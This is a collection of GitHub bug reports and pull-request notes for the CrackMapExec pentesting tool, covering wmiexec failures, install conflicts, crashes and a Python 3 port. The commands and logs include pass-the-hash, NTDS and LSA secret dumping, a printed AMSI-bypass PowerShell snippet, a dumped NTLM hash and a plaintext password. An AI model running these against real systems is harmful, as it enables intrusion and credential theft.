## Steps to reproduce

1. Running a PowerShell command on both Windows 7 and Windows 10

## Command string used

crackmapexec smb 192.168.1.25 -u admin -H <hash omitted> --exec-method wmiexec -X 'echo PowerShell test'

## CME verbose output (using the --verbose flag)

DEBUG                                          {'domain': None, 'wdigest': None, 'verbose': True, 'sam': False, 'cred_id': [], 'module_options': [], 'fail_limit': None, 'share': 'C$', 'lusers': False, 'module': None, 'smb_port': 445, 'show_options': False, 'rid_brute': None, 'uac': False, 'ufail_limit': None, 'pass_pol': False, 'regex': None, 'list_modules': False, 'no_output': False, 'pattern': None, 'lsa': False, 'force_ps32': False, 'shares': False, 'content': False, 'server_host': '0.0.0.0', 'wmi': None, 'exclude_dirs': '', 'server_port': None, 'wmi_namespace': '//./root/cimv2', 'gfail_limit': None, 'mssql_query': None, 'username': ['admin'], 'hash': ['<hash omitted>'], 'users': False, 'sessions': False, 'exec_method': 'wmiexec', 'spider': None, 'ps_execute': 'echo PowerShell test', 'threads': 100, 'mssql_port': 1433, 'password': [], 'mssql': False, 'mssql_auth': 'windows', 'ntds_pwdLastSet': False, 'execute': None, 'target': ['192.168.1.25'], 'ntds_history': False, 'disks': False, 'ntds': None, 'server': 'https', 'depth': 10, 'local_auth': False, 'timeout': 20}
CME          192.168.1.25:445 LIB-01   [*] Windows 6.1 Build 7601 (name:LIB-01) (domain:WORKGROUP)
CME          192.168.1.25:445 LIB-01   [+] WORKGROUP\admin <hash omitted> (Pwn3d!)
DEBUG                                          Unincoded command:
[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
try{ 
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
}catch{}
echo PowerShell test

DEBUG                                          Target system is 192.168.1.25 and isFDQN is False
DEBUG                                          StringBinding: \\\\LIB-01[\\PIPE\\atsvc]
DEBUG                                          StringBinding: LIB-01[49154]
DEBUG                                          StringBinding: \\\\LIB-01[\\PIPE\\srvsvc]
DEBUG                                          StringBinding: \\\\LIB-01[\\PIPE\\browser]
DEBUG                                          StringBinding chosen: None
DEBUG                                          Error executing command via wmiexec, traceback:
DEBUG                                          Traceback (most recent call last):
  File "/usr/lib/python2.7/dist-packages/cme/connection.py", line 446, in execute
    exec_method = WMIEXEC(self.host, self.username, self.password, self.domain, self.conn, self.hash, self.args.share)
  File "/usr/lib/python2.7/dist-packages/cme/execmethods/wmiexec.py", line 40, in __init__
    iWbemServices= iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
  File "build/bdist.linux-armv7l/egg/impacket/dcerpc/v5/dcom/wmi.py", line 3162, in NTLMLogin
    resp = self.request(request, iid = self._iid, uuid = self.get_iPid())
  File "build/bdist.linux-armv7l/egg/impacket/dcerpc/v5/dcomrt.py", line 1308, in request
    self.connect(iid)
  File "build/bdist.linux-armv7l/egg/impacket/dcerpc/v5/dcomrt.py", line 1268, in connect
    raise Exception('Can\'t find a valid stringBinding to connect')
Exception: Can't find a valid stringBinding to connect

Traceback (most recent call last):
  File "src/gevent/greenlet.py", line 766, in gevent._greenlet.Greenlet.run
  File "/usr/lib/python2.7/dist-packages/cme/connection.py", line 173, in __init__
    getattr(self, k)()
  File "/usr/lib/python2.7/dist-packages/cme/connection.py", line 39, in _decorator
    return func(self, *args, **kwargs)
  File "/usr/lib/python2.7/dist-packages/cme/connection.py", line 494, in ps_execute
    return self.execute(create_ps_command(payload), get_output, methods)
  File "/usr/lib/python2.7/dist-packages/cme/connection.py", line 39, in _decorator
    return func(self, *args, **kwargs)
  File "/usr/lib/python2.7/dist-packages/cme/connection.py", line 478, in execute
    output = u'{}'.format(exec_method.execute(payload, get_output).strip().decode('utf-8'))
UnboundLocalError: local variable 'exec_method' referenced before assignment
2019-12-23T19:27:10Z <Greenlet at 0x75561e88: Connection(Namespace(content=False, cred_id=[], depth=10, dis, <cme.database.CMEDatabase instance at 0x753fb788>, '192.168.1.25', None, None)> failed with UnboundLocalError

[*] KTHXBYE!

## CME Version (cme --version)

both 3.1.5 - 'Smidge' and 4.0.1dev - Bug Pr0n

## OS

kali-rolling 2019.4 on a Raspberry Pi 3

## Target OS

Both Windows 7 and Windows 10 produce the same issue

## Detailed issue explanation
For some reason when attempting to run any PowerShell commands I've found that both Windows 7 and Windows 10 machines give this output. I've tried running the command on a Windows Server 2003 machine on the same network and it executed fine. I can't seem to determine the problem. Does anyone here have any ideas?


The logger tell you LSA secrets are dump in a file named xxx.lsa

```
SMB        x.x.x.x 445    host       [+] Dumped 22 LSA secrets to /home/noraj/.cme/logs/host_x.x.x.x_2019-12-19_095552.lsa and /home/noraj/.cme/logs/host_x.x.x.x_2019-12-19_095552.cached
```

But in reality they are logged in xxx.screts.

So just fixing the extension showed by the  logger.
Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/pkg_resources/__init__.py", line 583, in _build_master
    ws.require(__requires__)
  File "/usr/lib/python3/dist-packages/pkg_resources/__init__.py", line 900, in require
    needed = self.resolve(parse_requirements(requirements))
  File "/usr/lib/python3/dist-packages/pkg_resources/__init__.py", line 791, in resolve
    raise VersionConflict(dist, req).with_context(dependent_req)
pkg_resources.VersionConflict: (crackmapexec 4.0.1.dev0 (/usr/local/lib/python3.7/dist-packages/crackmapexec-4.0.1.dev0-py3.7.egg), Requirement.parse('crackmapexec==3.1.5'))

During handling of the above exception, another exception occurred:

installing CME on Kali by "apt-get install":


Traceback (most recent call last):
  File "/usr/bin/crackmapexec", line 6, in <module>
    from pkg_resources import load_entry_point
  File "/usr/lib/python3/dist-packages/pkg_resources/__init__.py", line 3241, in <module>
    @_call_aside
  File "/usr/lib/python3/dist-packages/pkg_resources/__init__.py", line 3225, in _call_aside
    f(*args, **kwargs)
  File "/usr/lib/python3/dist-packages/pkg_resources/__init__.py", line 3254, in _initialize_master_working_set
    working_set = WorkingSet._build_master()
  File "/usr/lib/python3/dist-packages/pkg_resources/__init__.py", line 585, in _build_master
    return cls._build_from_requirements(__requires__)
  File "/usr/lib/python3/dist-packages/pkg_resources/__init__.py", line 598, in _build_from_requirements
    dists = ws.resolve(reqs, Environment())
  File "/usr/lib/python3/dist-packages/pkg_resources/__init__.py", line 786, in resolve
    raise DistributionNotFound(req, requirers)
pkg_resources.DistributionNotFound: The 'crackmapexec==3.1.5' distribution was not found and is required by the application

IF install "pip install crackmapexec" - it installs the 3.1.4 version. "pip install crackmapexec==3.1.5" can not find a package
This PR adds initial support for SSH keyfile authentication.

It also fixes an OpSec issue with the default paramiko behavior of trying all keys loaded in `ssh-agent` and all keys in `~/.ssh` by disallowing agent and key discovery.

I marked the PR as a work in progress because currently there is no keyfile support for the credential database, but it would probably be nice to have CME copy the key to the database and allow keyfile identities to be used as credentials.

Let me know what you think.

Cheers,
Alex
Added the DNS full domain name to the host's SMB result.
This will be used later when a full domain name is necessary in order to proceed.  
<del>**Don't merge anything yet, this PR is just here to keep you informate of the progress**</del>
---

**Progression**

- [x] --shares
- [x]  --sessions 
- [x]  --disks 
- [x]  --loggedon-users 
- [x]  --users
- [x]  --rid-brute
- [x]  --groups
- [x]  --local-groups 
- [x]  --pass-pol (local)
- [x] --pass-pol (domain)
- [x]  -x whoami
- [x] -X '$PSVersionTable' 
- [x] --sam
- [x] -H ntlm_hash
- [x] -u user.txt -p password.txt
- [x] --gen-relay-list
- [x] -d domain.local
- [x] --local-auth
- [x] --lsa
- [x] --ntds
- [x] <del>--ntds-history</del> option already deprecated in CME v4 python2
- [x] <del>--ntds-pwdLastSe</del> option already deprecated in CME v4 python2
- [x] --wmi 
- [ ] --exec-method smbexec -> not working but I got same result on CME v4 python2
- [x] --exec-method atexec
- [x] --exec-method wmiexec
- [x] --no-output
- [x] cmedb
- [x] --spider -> error from impacket lib, issue <del>open</del> **fixed** https://github.com/SecureAuthCorp/impacket/issues/691

---

- [x] module Mimikatz
- [x] module Bloodhound

**Modules** modules based on Empire project should be removed since the Empire project is dead and dev in python2. I didn't test them, hope it makes sense.

---
- [x] migrate pywerview to python3 https://github.com/mpgn/pywerview
- [x] pull request to pywerview repo (waiting for the merge https://github.com/the-useless-one/pywerview/pull/34)
---

<del>So far, I migrate the wmiexec.py file and lot of other stuff just to test how hard it will be to migrate :) </del>

I will continue the work over this week.

![image](https://user-images.githubusercontent.com/5891788/68571565-8d78d080-0463-11ea-9634-dd762c3af465.png)

How to use this PR ?

- with pipenv
```
git clone --recursive https://github.com/mpgn/CrackMapExec && cd CrackMapExec
git checkout python3
git submodule update --recursive
pipenv --python 3.7 install
pipenv shell
python setup.py install
cme
```

On latest Kali
```
git clone --recursive https://github.com/mpgn/CrackMapExec && cd CrackMapExec
git checkout python3
git submodule update --recursive
python3 setup.py install
cme
```

--- 

Couple of things @byt3bl33d3r  wants to take care of before merging this:
- [ ] Get rid of all of the submodules (This also would mean getting Pywerview on Pypi)
- [ ] Replace Gevent with Asyncio
- [ ] Package CME as a Zipapp with Shiv so people don't have to worry about installing cme in a virtualenv anymore
## Steps to reproduce
OS: Kali python 2.7
Target OS in the output
tried to reinstall 
have all requirments

crackmapexec smb 10.10.10.100  -u SVC_TGS -p somepasshere -M gpp_password --verbose

DEBUG                                          {'domain': None, 'wdigest': None, 'verbose': True, 'sam': False, 'cred_id': [], 'module_options': [], 'fail_limit': None, 'share': 'C$', 'lusers': False, 'module': 'gpp_password', 'smb_port': 445, 'show_options': False, 'rid_brute': None, 'uac': False, 'ufail_limit': None, 'pass_pol': False, 'regex': None, 'list_modules': False, 'no_output': False, 'pattern': None, 'lsa': False, 'force_ps32': False, 'shares': False, 'content': False, 'server_host': '0.0.0.0', 'wmi': None, 'exclude_dirs': '', 'server_port': None, 'wmi_namespace': '//./root/cimv2', 'gfail_limit': None, 'mssql_query': None, 'username': ['SVC_TGS'], 'hash': [], 'users': False, 'sessions': False, 'exec_method': None, 'spider': None, 'ps_execute': None, 'threads': 100, 'mssql_port': 1433, 'password': ['GPPstillStandingStrong2k18'], 'mssql': False, 'mssql_auth': 'windows', 'ntds_pwdLastSet': False, 'execute': None, 'target': ['smb', '10.10.10.100'], 'ntds_history': False, 'disks': False, 'ntds': None, 'server': 'https', 'depth': 10, 'local_auth': False, 'timeout': 20}
CME          10.10.10.100:445 DC              [*] Windows 6.1 Build 7601 (name:DC) (domain:ACTIVE)
Segmentation fault
 ...


## Steps to reproduce

`cme smb dc01.storm.ctf -u users.txt -p welcome1 --continue-on-success`
I'd post the output but it's of a client's network. --continue-on-success has never worked for me but I could really use it!
## Steps to reproduce

1. ... Ran the command against DC. After dumping few hashes, it throws this error message
2. ...

## Command string used
crackmapexec -u username -p 'P@ssword' -d COMPANYDOMAIN 192.168.1.5 --ntds vss

## CME verbose output (using the --verbose flag)
DEBUG                                          Trying to fetch page 4025 (0x1f74000)
DEBUG                                          Multivalue detected in column ATTc0, returning raw results
DEBUG                                          Multivalue detected in column ATTc0, returning raw results
DEBUG                                          Multivalue detected in column ATTc0, returning raw results
DEBUG                                          Multivalue detected in column ATTc0, returning raw results
DEBUG                                          Multivalue detected in column ATTc0, returning raw results
DEBUG                                          Trying to fetch page 4026 (0x1f76000)
DEBUG                                          Multivalue detected in column ATTc0, returning raw results
DEBUG                                          Decrypting hash for user: ABCD
CME          192.168.1.5:445 ABCD02        companydomain.com\abcd:2408:aad3b435b51404eeaad3b435b51404ee:4424147a7dab3c47c4bb3921443023bd:::
DEBUG                                          Multivalue detected in column ATTc0, returning raw results
DEBUG                                          Multivalue detected in column ATTc0, returning raw results
DEBUG                                          Multivalue detected in column ATTc0, returning raw results
DEBUG                                          Multivalue detected in column ATTc0, returning raw results
DEBUG                                          Cleaning up... 
DEBUG                                          Stopping service RemoteRegistry
Traceback (most recent call last):
  File "src/gevent/greenlet.py", line 716, in gevent._greenlet.Greenlet.run
  File "/usr/lib/python2.7/dist-packages/cme/connection.py", line 173, in __init__
    getattr(self, k)()
  File "/usr/lib/python2.7/dist-packages/cme/connection.py", line 39, in _decorator
    return func(self, *args, **kwargs)
  File "/usr/lib/python2.7/dist-packages/cme/connection.py", line 507, in ntds
    DumpSecrets(self).NTDS_dump(self.args.ntds, self.args.ntds_pwdLastSet, self.args.ntds_history)
  File "/usr/lib/python2.7/dist-packages/cme/credentials/secretsdump.py", line 156, in NTDS_dump
    self.cleanup()
  File "/usr/lib/python2.7/dist-packages/cme/credentials/secretsdump.py", line 161, in cleanup
    self.__remoteOps.finish()
  File "/usr/lib/python2.7/dist-packages/cme/remoteoperations.py", line 328, in finish
    self.__restore()
  File "/usr/lib/python2.7/dist-packages/cme/remoteoperations.py", line 292, in __restore
    scmr.hRControlService(self.__scmr, self.__serviceHandle, scmr.SERVICE_CONTROL_STOP)
  File "/usr/lib/python2.7/dist-packages/impacket/dcerpc/v5/scmr.py", line 1164, in hRControlService
    return dce.request(request)
  File "/usr/lib/python2.7/dist-packages/impacket/dcerpc/v5/rpcrt.py", line 858, in request
    raise exception
DCERPCSessionError: SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
2019-10-08T06:51:00Z <Greenlet "Greenlet-0" at 0x7f25f54dfaf0: Connection(Namespace(content=False, cred_id=[], depth=10, dis, <cme.database.CMEDatabase instance at 0x7f25f54bad, '192.168.1.5', None, None)> failed with DCERPCSessionError
## CME Version (cme --version)
root@kali:~# crackmapexec -v
3.1.5 - 'Smidge'
## OS
Kali Linux 2019
## Target OS
Windows 6.3 Build 9600 (Windows Server 2012 R2)

## Detailed issue explanation
See above
Getting the below issue where it looks like the I can connect and and authenticate, but dont get a return back.  Also i dont get the pwd thing either....version 3 or 4 does the same thing.  Oddly if i run a pass-pol i get info back:

crackmapexec smb 172.16.1.231 -u user -p pasword --exec-method wmiexec -x 'dir'
CME          x.x.x.x:445 WIN-H8J78OM0BIU [*] Windows 6.1 Build 7601 (name:WIN-H8J78OM0BIU) (domain:WIN-H8J78OM0BIU)
CME          x.x.x.x:445 WIN-H8J78OM0BIU [+] WIN-H8J78OM0BIU\user:password
CME          172.16.1.231:445 WIN-H8J78OM0BIU [+] Enumerating active sessions
[*] KTHXBYE!



but i get nothing back
